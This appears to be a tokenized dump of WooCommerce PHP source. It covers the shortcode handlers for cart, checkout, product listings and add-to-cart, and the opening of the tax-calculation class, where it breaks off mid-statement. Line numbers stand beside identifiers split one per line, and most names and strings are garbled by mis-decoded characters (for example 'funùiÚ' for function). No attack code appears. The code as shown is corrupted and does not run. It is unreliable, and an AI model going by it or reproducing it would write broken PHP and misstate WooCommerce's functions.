$aá”
;

73  
	`ob_g‘_ş—n
();

74 
	}
}

83 
public
 
funùiÚ
 
	$ÿ¹
Ğ
$©ts
 ) {

84  
£lf
::
	`shÜtcode_w¿µ”
Ğ
	`¬¿y
Ğ'WC_ShÜtcode_C¬t', 'ouut' ), 
$©ts
 );

85 
	}
}

94 
public
 
funùiÚ
 
	$checkout
Ğ
$©ts
 ) {

95  
£lf
::
	`shÜtcode_w¿µ”
Ğ
	`¬¿y
Ğ'WC_ShÜtcode_Checkout', 'ouut' ), 
$©ts
 );

96 
	}
}

105 
public
 
funùiÚ
 
	$Üd”_Œackšg
Ğ
$©ts
 ) {

106  
£lf
::
	`shÜtcode_w¿µ”
Ğ
	`¬¿y
Ğ'WC_ShÜtcode_Ord”_T¿ckšg', 'ouut' ), 
$©ts
 );

107 
	}
}

116 
public
 
funùiÚ
 
	$my_accouÁ
Ğ
$©ts
 ) {

117  
£lf
::
	`shÜtcode_w¿µ”
Ğ
	`¬¿y
Ğ'WC_ShÜtcode_My_AccouÁ', 'ouut' ), 
$©ts
 );

118 
	}
}

127 
public
 
funùiÚ
 
	$´oduù_ÿ‹gÜy
Ğ
$©ts
 ) {

128 
glob®
 
$woocomm”û_loİ
;

130 iàĞ
	`em±y
Ğ
$©ts
 ) )  '';

132 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

139 ), 
$©ts
 ) );

141 iàĞ! 
$ÿ‹gÜy
 )  '';

144 
$Üd”šg_¬gs
 = 
	`WC
()->
qu”y
->
	`g‘_ÿlog_Üd”šg_¬gs
Ğ
$Üd”by
, 
$Üd”
 );

146 
$¬gs
 = 
	`¬¿y
(

150 'Üd”by' => 
$Üd”šg_¬gs
['orderby'],

151 'Üd”' => 
$Üd”šg_¬gs
['order'],

152 'po¡s_³r_·ge' => 
$³r_·ge
,

153 'm‘a_qu”y' => 
	`¬¿y
(

154 
	`¬¿y
(

156 'v®ue' => 
	`¬¿y
('catalog', 'visible'),

160 'x_qu”y' => 
	`¬¿y
(

161 
	`¬¿y
(

163 '‹rms' => 
	`¬¿y
Ğ
	`esc_©Œ
Ğ
$ÿ‹gÜy
 ) ),

165 'İ”©Ü' => 
$İ”©Ü


170 iàĞ
	`is£t
Ğ
$Üd”šg_¬gs
['meta_key'] ) ) {

171 
$¬gs
['m‘a_key'] = 
$Üd”šg_¬gs
['meta_key'];

174 
	`ob_¡¬t
();

176 
$´oduùs
 = 
Ãw
 
	`WP_Qu”y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_shÜtcode_´oduùs_qu”y', 
$¬gs
, 
$©ts
 ) );

178 
$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

180 iàĞ
$´oduùs
->
	`have_po¡s
() ) : ?>

182 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

184 <?
php
  
$´oduùs
->
	`have_po¡s
(èè: $´oduùs->
	`the_po¡
(); ?>

186 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

188 <?
php
 
’dwhe
;

190 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

192 <?
php
 
’dif
;

194 
	`woocomm”û_»£t_loİ
();

195 
	`wp_»£t_po¡d©a
();

197  '<div cÏss="woocomm”û cŞumns-' . 
$cŞumns
 . '">' . 
	`ob_g‘_ş—n
() . '</div>';

198 
	}
}

208 
public
 
funùiÚ
 
	$´oduù_ÿ‹gÜ›s
Ğ
$©ts
 ) {

209 
glob®
 
$woocomm”û_loİ
;

211 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

212 'numb”' => 
nuÎ
,

218 ), 
$©ts
 ) );

220 iàĞ
	`is£t
Ğ
$©ts
[ 'ids' ] ) ) {

221 
$ids
 = 
	`ex¶ode
Ğ',', 
$©ts
[ 'ids' ] );

222 
$ids
 = 
	`¬¿y_m­
( 'trim', $ids );

224 
$ids
 = 
	`¬¿y
();

227 
$hide_em±y
 = ( $hide_em±y =ğ
Œue
 || $hide_empty == 1 ) ? 1 : 0;

230 
$¬gs
 = 
	`¬¿y
(

231 'Üd”by' => 
$Üd”by
,

232 'Üd”' => 
$Üd”
,

233 'hide_em±y' => 
$hide_em±y
,

234 'šşude' => 
$ids
,

235 '·d_couÁs' => 
Œue
,

236 'chd_of' => 
$·»Á


239 
$´oduù_ÿ‹gÜ›s
 = 
	`g‘_‹rms
Ğ'´oduù_ÿt', 
$¬gs
 );

241 iàĞ
$·»Á
 !== "" ) {

242 
$´oduù_ÿ‹gÜ›s
 = 
	`wp_li¡_f‹r
Ğ$´oduù_ÿ‹gÜ›s, 
	`¬¿y
Ğ'·»Á' => 
$·»Á
 ) );

245 iàĞ
$hide_em±y
 ) {

246 
	`fÜ—ch
 ( 
$´oduù_ÿ‹gÜ›s
 
as
 
$key
 => 
$ÿ‹gÜy
 ) {

247 iàĞ
$ÿ‹gÜy
->
couÁ
 == 0 ) {

248 
	`un£t
Ğ
$´oduù_ÿ‹gÜ›s
[ 
$key
 ] );

253 iàĞ
$numb”
 ) {

254 
$´oduù_ÿ‹gÜ›s
 = 
	`¬¿y_¦iû
Ğ$´oduù_ÿ‹gÜ›s, 0, 
$numb”
 );

257 
$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

259 
	`ob_¡¬t
();

262 
$woocomm”û_loİ
['loop'] = $woocommerce_loop['column'] = '';

264 iàĞ
$´oduù_ÿ‹gÜ›s
 ) {

266 
	`woocomm”û_´oduù_loİ_¡¬t
();

268 
	`fÜ—ch
 ( 
$´oduù_ÿ‹gÜ›s
 
as
 
$ÿ‹gÜy
 ) {

270 
	`wc_g‘_‹m¶©e
Ğ'cÚ‹Á-´oduù_ÿt.php', 
	`¬¿y
(

271 'ÿ‹gÜy' => 
$ÿ‹gÜy


276 
	`woocomm”û_´oduù_loİ_’d
();

280 
	`woocomm”û_»£t_loİ
();

282  '<div cÏss="woocomm”û cŞumns-' . 
$cŞumns
 . '">' . 
	`ob_g‘_ş—n
() . '</div>';

283 
	}
}

292 
public
 
funùiÚ
 
	$»ûÁ_´oduùs
Ğ
$©ts
 ) {

293 
glob®
 
$woocomm”û_loİ
;

295 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

300 ), 
$©ts
 ) );

302 
$m‘a_qu”y
 = 
	`WC
()->
qu”y
->
	`g‘_m‘a_qu”y
();

304 
$¬gs
 = 
	`¬¿y
(

308 'po¡s_³r_·ge' => 
$³r_·ge
,

309 'Üd”by' => 
$Üd”by
,

310 'Üd”' => 
$Üd”
,

311 'm‘a_qu”y' => 
$m‘a_qu”y


314 
	`ob_¡¬t
();

316 
$´oduùs
 = 
Ãw
 
	`WP_Qu”y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_shÜtcode_´oduùs_qu”y', 
$¬gs
, 
$©ts
 ) );

318 
$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

320 iàĞ
$´oduùs
->
	`have_po¡s
() ) : ?>

322 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

324 <?
php
  
$´oduùs
->
	`have_po¡s
(èè: $´oduùs->
	`the_po¡
(); ?>

326 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

328 <?
php
 
’dwhe
;

330 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

332 <?
php
 
’dif
;

334 
	`wp_»£t_po¡d©a
();

336  '<div cÏss="woocomm”û cŞumns-' . 
$cŞumns
 . '">' . 
	`ob_g‘_ş—n
() . '</div>';

337 
	}
}

347 
public
 
funùiÚ
 
	$´oduùs
Ğ
$©ts
 ) {

348 
glob®
 
$woocomm”û_loİ
;

350 iàĞ
	`em±y
Ğ
$©ts
 ) )  '';

352 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

356 ), 
$©ts
 ) );

358 
$¬gs
 = 
	`¬¿y
(

362 'Üd”by' => 
$Üd”by
,

363 'Üd”' => 
$Üd”
,

365 'm‘a_qu”y' => 
	`¬¿y
(

366 
	`¬¿y
(

368 'v®ue' => 
	`¬¿y
('catalog', 'visible'),

374 iàĞ
	`is£t
Ğ
$©ts
['skus'] ) ) {

375 
$skus
 = 
	`ex¶ode
Ğ',', 
$©ts
['skus'] );

376 
$skus
 = 
	`¬¿y_m­
( 'trim', $skus );

377 
$¬gs
['m‘a_qu”y'][] = 
	`¬¿y
(

379 'v®ue' => 
$skus
,

384 iàĞ
	`is£t
Ğ
$©ts
['ids'] ) ) {

385 
$ids
 = 
	`ex¶ode
Ğ',', 
$©ts
['ids'] );

386 
$ids
 = 
	`¬¿y_m­
( 'trim', $ids );

387 
$¬gs
['po¡__š'] = 
$ids
;

390 
	`ob_¡¬t
();

392 
$´oduùs
 = 
Ãw
 
	`WP_Qu”y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_shÜtcode_´oduùs_qu”y', 
$¬gs
, 
$©ts
 ) );

394 
$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

396 iàĞ
$´oduùs
->
	`have_po¡s
() ) : ?>

398 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

400 <?
php
  
$´oduùs
->
	`have_po¡s
(èè: $´oduùs->
	`the_po¡
(); ?>

402 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

404 <?
php
 
’dwhe
;

406 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

408 <?
php
 
’dif
;

410 
	`wp_»£t_po¡d©a
();

412  '<div cÏss="woocomm”û cŞumns-' . 
$cŞumns
 . '">' . 
	`ob_g‘_ş—n
() . '</div>';

413 
	}
}

423 
public
 
funùiÚ
 
	$´oduù
Ğ
$©ts
 ) {

424 iàĞ
	`em±y
Ğ
$©ts
 ) )  '';

426 
$¬gs
 = 
	`¬¿y
(

431 'm‘a_qu”y' => 
	`¬¿y
(

432 
	`¬¿y
(

434 'v®ue' => 
	`¬¿y
('catalog', 'visible'),

440 iàĞ
	`is£t
Ğ
$©ts
['sku'] ) ) {

441 
$¬gs
['m‘a_qu”y'][] = 
	`¬¿y
(

443 'v®ue' => 
$©ts
['sku'],

448 iàĞ
	`is£t
Ğ
$©ts
['id'] ) ) {

449 
$¬gs
['p'] = 
$©ts
['id'];

452 
	`ob_¡¬t
();

454 
$´oduùs
 = 
Ãw
 
	`WP_Qu”y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_shÜtcode_´oduùs_qu”y', 
$¬gs
, 
$©ts
 ) );

456 iàĞ
$´oduùs
->
	`have_po¡s
() ) : ?>

458 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

460 <?
php
  
$´oduùs
->
	`have_po¡s
(èè: $´oduùs->
	`the_po¡
(); ?>

462 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

464 <?
php
 
’dwhe
;

466 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

468 <?
php
 
’dif
;

470 
	`wp_»£t_po¡d©a
();

472  '<div cÏss="woocomm”û">' . 
	`ob_g‘_ş—n
() . '</div>';

473 
	}
}

482 
public
 
funùiÚ
 
	$´oduù_add_to_ÿ¹
Ğ
$©ts
 ) {

483 
glob®
 
$wpdb
, 
$po¡
;

485 iàĞ
	`em±y
Ğ
$©ts
 ) )  '';

487 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

492 ), 
$©ts
 ) );

494 iàĞ! 
	`em±y
Ğ
$id
 ) ) {

495 
$´oduù_d©a
 = 
	`g‘_po¡
Ğ
$id
 );

496 } 
	`–£if
 ( ! 
	`em±y
Ğ
$sku
 ) ) {

497 
$´oduù_id
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT…o¡_id FROM $wpdb->po¡m‘¨WHERE m‘a_key='_sku' AND m‘a_v®ue='%s' LIMIT 1", 
$sku
 ) );

498 
$´oduù_d©a
 = 
	`g‘_po¡
Ğ
$´oduù_id
 );

503 
$´oduù
 = 
	`wc_£tup_´oduù_d©a
Ğ
$´oduù_d©a
 );

505 iàĞ! 
$´oduù
 ) {

509 
	`ob_¡¬t
();

511 <
p
 
şass
="´oduù woocomm”û" 
¡yË
="<?phpƒcho $style; ?>">

513 <?
php
 iàĞ
$show_´iû
 == 'true' ) : ?>

514 <?
php
 
echo
 
$´oduù
->
	`g‘_´iû_html
(); ?>

515 <?
php
 
’dif
; ?>

517 <?
php
 
	`woocomm”û_‹m¶©e_loİ_add_to_ÿ¹
(); ?>

519 </
p
><?
php


522 
	`wc_£tup_´oduù_d©a
Ğ
$po¡
 );

524  
	`ob_g‘_ş—n
();

525 
	}
}

534 
public
 
funùiÚ
 
	$´oduù_add_to_ÿ¹_u¾
Ğ
$©ts
 ) {

535 
glob®
 
$wpdb
;

537 iàĞ
	`em±y
Ğ
$©ts
 ) )  '';

539 iàĞ
	`is£t
Ğ
$©ts
['id'] ) ) {

540 
$´oduù_d©a
 = 
	`g‘_po¡
Ğ
$©ts
['id'] );

541 } 
	`–£if
 ( 
	`is£t
Ğ
$©ts
['sku'] ) ) {

542 
$´oduù_id
 = 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT…o¡_id FROM $wpdb->po¡m‘¨WHERE m‘a_key='_sku' AND m‘a_v®ue='%s' LIMIT 1", 
$©ts
['sku'] ) );

543 
$´oduù_d©a
 = 
	`g‘_po¡
Ğ
$´oduù_id
 );

548 iàĞ'´oduù' !=ğ
$´oduù_d©a
->
po¡_ty³
 ) {

552 
$_´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_d©a
 );

554  
	`esc_u¾
Ğ
$_´oduù
->
	`add_to_ÿ¹_u¾
() );

555 
	}
}

564 
public
 
funùiÚ
 
	$§Ë_´oduùs
Ğ
$©ts
 ) {

565 
glob®
 
$woocomm”û_loİ
;

567 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

572 ), 
$©ts
 ) );

575 
$´oduù_ids_Ú_§Ë
 = 
	`wc_g‘_´oduù_ids_Ú_§Ë
();

577 
$m‘a_qu”y
 = 
	`¬¿y
();

578 
$m‘a_qu”y
[] = 
	`WC
()->
qu”y
->
	`visib™y_m‘a_qu”y
();

579 
$m‘a_qu”y
[] = 
	`WC
()->
qu”y
->
	`¡ock_¡©us_m‘a_qu”y
();

580 
$m‘a_qu”y
 = 
	`¬¿y_f‹r
( $meta_query );

582 
$¬gs
 = 
	`¬¿y
(

583 'po¡s_³r_·ge' => 
$³r_·ge
,

584 'Üd”by' => 
$Üd”by
,

585 'Üd”' => 
$Üd”
,

589 'm‘a_qu”y' => 
$m‘a_qu”y
,

590 'po¡__š' => 
	`¬¿y_m”ge
Ğ
	`¬¿y
Ğ0 ), 
$´oduù_ids_Ú_§Ë
 )

593 
	`ob_¡¬t
();

595 
$´oduùs
 = 
Ãw
 
	`WP_Qu”y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_shÜtcode_´oduùs_qu”y', 
$¬gs
, 
$©ts
 ) );

597 
$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

599 iàĞ
$´oduùs
->
	`have_po¡s
() ) : ?>

601 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

603 <?
php
  
$´oduùs
->
	`have_po¡s
(èè: $´oduùs->
	`the_po¡
(); ?>

605 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

607 <?
php
 
’dwhe
;

609 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

611 <?
php
 
’dif
;

613 
	`wp_»£t_po¡d©a
();

615  '<div cÏss="woocomm”û cŞumns-' . 
$cŞumns
 . '">' . 
	`ob_g‘_ş—n
() . '</div>';

616 
	}
}

625 
public
 
funùiÚ
 
	$be¡_£Îšg_´oduùs
Ğ
$©ts
 ) {

626 
glob®
 
$woocomm”û_loİ
;

628 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

631 ), 
$©ts
 ) );

633 
$¬gs
 = 
	`¬¿y
(

637 'po¡s_³r_·ge' => 
$³r_·ge
,

640 'm‘a_qu”y' => 
	`¬¿y
(

641 
	`¬¿y
(

643 'v®ue' => 
	`¬¿y
( 'catalog', 'visible' ),

649 
	`ob_¡¬t
();

651 
$´oduùs
 = 
Ãw
 
	`WP_Qu”y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_shÜtcode_´oduùs_qu”y', 
$¬gs
, 
$©ts
 ) );

653 
$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

655 iàĞ
$´oduùs
->
	`have_po¡s
() ) : ?>

657 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

659 <?
php
  
$´oduùs
->
	`have_po¡s
(èè: $´oduùs->
	`the_po¡
(); ?>

661 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

663 <?
php
 
’dwhe
;

665 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

667 <?
php
 
’dif
;

669 
	`wp_»£t_po¡d©a
();

671  '<div cÏss="woocomm”û cŞumns-' . 
$cŞumns
 . '">' . 
	`ob_g‘_ş—n
() . '</div>';

672 
	}
}

681 
public
 
funùiÚ
 
	$tİ_¿‹d_´oduùs
Ğ
$©ts
 ) {

682 
glob®
 
$woocomm”û_loİ
;

684 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

689 ), 
$©ts
 ) );

691 
$¬gs
 = 
	`¬¿y
(

695 'Üd”by' => 
$Üd”by
,

696 'Üd”' => 
$Üd”
,

697 'po¡s_³r_·ge' => 
$³r_·ge
,

698 'm‘a_qu”y' => 
	`¬¿y
(

699 
	`¬¿y
(

701 'v®ue' => 
	`¬¿y
('catalog', 'visible'),

707 
	`ob_¡¬t
();

709 
	`add_f‹r
Ğ'po¡s_şau£s', 
	`¬¿y
Ğ
__CLASS__
, 'order_by_rating_post_clauses' ) );

711 
$´oduùs
 = 
Ãw
 
	`WP_Qu”y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_shÜtcode_´oduùs_qu”y', 
$¬gs
, 
$©ts
 ) );

713 
	`»move_f‹r
Ğ'po¡s_şau£s', 
	`¬¿y
Ğ
__CLASS__
, 'order_by_rating_post_clauses' ) );

715 
$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

717 iàĞ
$´oduùs
->
	`have_po¡s
() ) : ?>

719 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

721 <?
php
  
$´oduùs
->
	`have_po¡s
(èè: $´oduùs->
	`the_po¡
(); ?>

723 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

725 <?
php
 
’dwhe
;

727 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

729 <?
php
 
’dif
;

731 
	`wp_»£t_po¡d©a
();

733  '<div cÏss="woocomm”û cŞumns-' . 
$cŞumns
 . '">' . 
	`ob_g‘_ş—n
() . '</div>';

734 
	}
}

743 
public
 
funùiÚ
 
	$ã©u»d_´oduùs
Ğ
$©ts
 ) {

744 
glob®
 
$woocomm”û_loİ
;

746 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

751 ), 
$©ts
 ) );

753 
$¬gs
 = 
	`¬¿y
(

757 'po¡s_³r_·ge' => 
$³r_·ge
,

758 'Üd”by' => 
$Üd”by
,

759 'Üd”' => 
$Üd”
,

760 'm‘a_qu”y' => 
	`¬¿y
(

761 
	`¬¿y
(

763 'v®ue' => 
	`¬¿y
('catalog', 'visible'),

766 
	`¬¿y
(

773 
	`ob_¡¬t
();

775 
$´oduùs
 = 
Ãw
 
	`WP_Qu”y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_shÜtcode_´oduùs_qu”y', 
$¬gs
, 
$©ts
 ) );

777 
$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

779 iàĞ
$´oduùs
->
	`have_po¡s
() ) : ?>

781 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

783 <?
php
  
$´oduùs
->
	`have_po¡s
(èè: $´oduùs->
	`the_po¡
(); ?>

785 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

787 <?
php
 
’dwhe
;

789 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

791 <?
php
 
’dif
;

793 
	`wp_»£t_po¡d©a
();

795  '<div cÏss="woocomm”û cŞumns-' . 
$cŞumns
 . '">' . 
	`ob_g‘_ş—n
() . '</div>';

796 
	}
}

806 
public
 
funùiÚ
 
	$´oduù_·ge
Ğ
$©ts
 ) {

807 iàĞ
	`em±y
Ğ
$©ts
 ) )  '';

809 iàĞ! 
	`is£t
Ğ
$©ts
['id'] ) && ! isset( $atts['sku'] ) )  '';

811 
$¬gs
 = 
	`¬¿y
(

819 iàĞ
	`is£t
Ğ
$©ts
['sku'] ) ) {

820 
$¬gs
['m‘a_qu”y'][] = 
	`¬¿y
(

822 'v®ue' => 
$©ts
['sku'],

827 iàĞ
	`is£t
Ğ
$©ts
['id'] ) ) {

828 
$¬gs
['p'] = 
$©ts
['id'];

831 
$sšgË_´oduù
 = 
Ãw
 
	`WP_Qu”y
Ğ
$¬gs
 );

833 
	`ob_¡¬t
();

835  
$sšgË_´oduù
->
	`have_po¡s
(èè: $sšgË_´oduù->
	`the_po¡
(); 
	`wp_’queue_süt
( 'wc-single-product' ); ?>

837 <
div
 
şass
="single-product">

839 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'single-product' ); ?>

841 </
div
>

843 <?
php
 
’dwhe
;

845 
	`wp_»£t_po¡d©a
();

847  '<div cÏss="woocomm”û">' . 
	`ob_g‘_ş—n
() . '</div>';

848 
	}
}

857 
public
 
funùiÚ
 
	$shİ_mes§ges
() {

858 
	`ob_¡¬t
();

860 
	`wc_´št_nÙiûs
();

862  '<div cÏss="woocomm”û">' . 
	`ob_g‘_ş—n
() . '</div>';

863 
	}
}

872 
public
 
funùiÚ
 
	$Üd”_by_¿tšg_po¡_şau£s
Ğ
$¬gs
 ) {

873 
glob®
 
$wpdb
;

875 
$¬gs
['where'] .= " AND $wpdb->commentmeta.meta_key = 'rating' ";

877 
$¬gs
['join'] .= "

878 
LEFT
 
JOIN
 
$wpdb
->
comm’ts
 
	`ON
($wpdb->
po¡s
.
ID
 = $wpdb->comm’ts.
comm’t_po¡_ID
)

879 
LEFT
 
JOIN
 
$wpdb
->
comm’tm‘a
 
	`ON
($wpdb->
comm’ts
.
comm’t_ID
 = $wpdb->comm’tm‘a.
comm’t_id
)

882 
$¬gs
['orderby'] = "$wpdb->commentmeta.meta_value DESC";

884 
$¬gs
['groupby'] = "$wpdb->posts.ID";

886  
$¬gs
;

887 
	}
}

898 
public
 
funùiÚ
 
	$´oduù_©Œibu‹
Ğ
$©ts
 ) {

899 
glob®
 
$woocomm”û_loİ
;

901 
	`exŒaù
Ğ
	`shÜtcode_©ts
Ğ
	`¬¿y
(

908 ), 
$©ts
 ) );

910 
$©Œibu‹
 = 
	`¡r¡r
Ğ$©Œibu‹, '·_' ) ? 
	`§n™ize_t™Ë
( $attribute ) : 'pa_' . sanitize_title( $attribute );

912 
$¬gs
 = 
	`¬¿y
(

916 'po¡s_³r_·ge' => 
$³r_·ge
,

917 'Üd”by' => 
$Üd”by
,

918 'Üd”' => 
$Üd”
,

919 'm‘a_qu”y' => 
	`¬¿y
(

920 
	`¬¿y
(

922 'v®ue' => 
	`¬¿y
('catalog', 'visible'),

926 'x_qu”y' => 
	`¬¿y
(

927 
	`¬¿y
(

928 'xÚomy' => 
$©Œibu‹
,

929 '‹rms' => 
	`¬¿y_m­
Ğ'§n™ize_t™Ë', 
	`ex¶ode
Ğ",", 
$f‹r
 ) ),

935 
	`ob_¡¬t
();

937 
$´oduùs
 = 
Ãw
 
	`WP_Qu”y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_shÜtcode_´oduùs_qu”y', 
$¬gs
, 
$©ts
 ) );

939 
$woocomm”û_loİ
['cŞumns'] = 
$cŞumns
;

941 iàĞ
$´oduùs
->
	`have_po¡s
() ) : ?>

943 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

945 <?
php
  
$´oduùs
->
	`have_po¡s
(èè: $´oduùs->
	`the_po¡
(); ?>

947 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

949 <?
php
 
’dwhe
;

951 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

953 <?
php
 
’dif
;

955 
	`wp_»£t_po¡d©a
();

957  '<div cÏss="woocomm”û">' . 
	`ob_g‘_ş—n
() . '</div>';

958 
	}
}

964 
public
 
funùiÚ
 
	$»Ï‹d_´oduùs
Ğ
$©ts
 ) {

966 
$©ts
 = 
	`shÜtcode_©ts
Ğ
	`¬¿y
(

970 ), 
$©ts
 );

972 iàĞ
	`is£t
Ğ
$©ts
['per_page'] ) ) {

973 
	`_d•»ÿ‹d_¬gum’t
Ğ
__CLASS__
 . '->' . 
__FUNCTION__
, '2.1', 
	`__
( 'Use $args["posts_per_page"] instead. Deprecated‡rgument will be„emoved in WC 2.2.', 'woocommerce' ) );

974 
$©ts
['posts_per_page'] = $atts['per_page'];

975 
	`un£t
Ğ
$©ts
['per_page'] );

978 
	`ob_¡¬t
();

980 
	`woocomm”û_»Ï‹d_´oduùs
Ğ
$©ts
 );

982  
	`ob_g‘_ş—n
();

983 
	}
}

	@includes/class-wc-tax.php

1 <?
php


11 şas 
	cWC_Tax
 {

14 
public
 
	m$m©ched_¿‹s
;

17 
v¬
 
	m$log
 = 
¬¿y
();

24 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

25 
$this
->
´ecisiÚ
 = 
WC_ROUNDING_PRECISION
;

26 
$this
->
dp
 = (è
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' );

27 
$this
->
round_©_subtÙ®
 = 
	`g‘_İtiÚ
('woocommerce_tax_round_at_subtotal') == 'yes';

38 
public
 
funùiÚ
 
	$ÿlc_x
Ğ
$´iû
, 
$¿‹s
, 
$´iû_šşudes_x
 = 
çl£
, 
$suµ»ss_roundšg
 = false ) {

40 
$´iû
 = 
$this
->
	`´ecisiÚ
( $price );

42 iàĞ
$´iû_šşudes_x
 )

43 
$xes
 = 
$this
->
	`ÿlc_šşusive_x
Ğ
$´iû
, 
$¿‹s
 );

45 
$xes
 = 
$this
->
	`ÿlc_exşusive_x
Ğ
$´iû
, 
$¿‹s
 );

48 iàĞ! 
$this
->
round_©_subtÙ®
 && ! 
$suµ»ss_roundšg
 ) {

49 
$xes
 = 
	`¬¿y_m­
( 'round', $taxes );

53 
$´iû
 = 
$this
->
	`»move_´ecisiÚ
( $price );

54 
$xes
 = 
	`¬¿y_m­
Ğ
	`¬¿y
Ğ
$this
, 'remove_precision' ), $taxes );

56  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿlc_x', 
$xes
, 
$´iû
, 
$¿‹s
, 
$´iû_šşudes_x
, 
$suµ»ss_roundšg
 );

57 
	}
}

66 
public
 
funùiÚ
 
	$ÿlc_shpšg_x
Ğ
$´iû
, 
$¿‹s
 ) {

67  
$this
->
	`ÿlc_exşusive_x
Ğ
$´iû
, 
$¿‹s
 );

68 
	}
}

75 
´iv©e
 
funùiÚ
 
	$´ecisiÚ
Ğ
$´iû
 ) {

76  
$´iû
 * ( 
	`pow
Ğ10, 
$this
->
´ecisiÚ
 ) );

77 
	}
}

84 
´iv©e
 
funùiÚ
 
	$»move_´ecisiÚ
Ğ
$´iû
 ) {

85  
$´iû
 / ( 
	`pow
Ğ10, 
$this
->
´ecisiÚ
 ) );

86 
	}
}

98 
public
 
funùiÚ
 
	$round
Ğ
$š
 ) {

99  
	`­¶y_f‹rs
Ğ'woocomm”û_x_round', 
	`round
Ğ
$š
, 
$this
->
´ecisiÚ
 ), $in );

100 
	}
}

109 
´iv©e
 
funùiÚ
 
	$ÿlc_šşusive_x
Ğ
$´iû
, 
$¿‹s
 ) {

110 
$xes
 = 
	`¬¿y
();

112 
$»guÏr_x_¿‹s
 = 
$compound_x_¿‹s
 = 0;

114 
	`fÜ—ch
 ( 
$¿‹s
 
as
 
$key
 => 
$¿‹
 )

115 iàĞ
$¿‹
['compound'] == 'yes' )

116 
$compound_x_¿‹s
 = $compound_x_¿‹ + 
$¿‹
['rate'];

118 
$»guÏr_x_¿‹s
 = $»guÏr_x_¿‹ + 
$¿‹
['rate'];

120 
$»guÏr_x_¿‹
 = 1 + ( 
$»guÏr_x_¿‹s
 / 100 );

121 
$compound_x_¿‹
 = 1 + ( 
$compound_x_¿‹s
 / 100 );

122 
$nÚ_compound_´iû
 = 
$´iû
 / 
$compound_x_¿‹
;

124 
	`fÜ—ch
 ( 
$¿‹s
 
as
 
$key
 => 
$¿‹
 ) {

125 iàĞ! 
	`is£t
Ğ
$xes
[ 
$key
 ] ) )

126 
$xes
[ 
$key
 ] = 0;

128 
$the_¿‹
 = 
$¿‹
['rate'] / 100;

130 iàĞ
$¿‹
['compound'] == 'yes' ) {

131 
$the_´iû
 = 
$´iû
;

132 
$the_¿‹
 = $the_¿‹ / 
$compound_x_¿‹
;

134 
$the_´iû
 = 
$nÚ_compound_´iû
;

135 
$the_¿‹
 = $the_¿‹ / 
$»guÏr_x_¿‹
;

138 
$Ãt_´iû
 = 
$´iû
 - ( 
$the_¿‹
 * 
$the_´iû
 );

139 
$x_amouÁ
 = 
$´iû
 - 
$Ãt_´iû
;

140 
$xes
[ 
$key
